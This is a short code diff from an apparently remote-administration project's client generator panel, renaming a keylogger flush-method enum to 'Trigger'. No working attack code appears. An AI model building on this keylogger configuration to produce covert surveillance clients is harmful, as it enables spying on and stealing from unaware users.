@@ -56,7 +56,7 @@ import javax.swing.border.TitledBorder;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
-import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.ui.StatusLabel;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -649,7 +649,7 @@ public class GenPanel extends JPanel {
 		}
 
 		// keylogger options
-		ic.setKeyloggerFlushMethod(FLUSH_METHOD.EVENT);
+		ic.setKeyloggerFlushMethod(Trigger.EVENT);
 		ic.setKeyloggerFlushValue(15);
 
 		return ic.build();
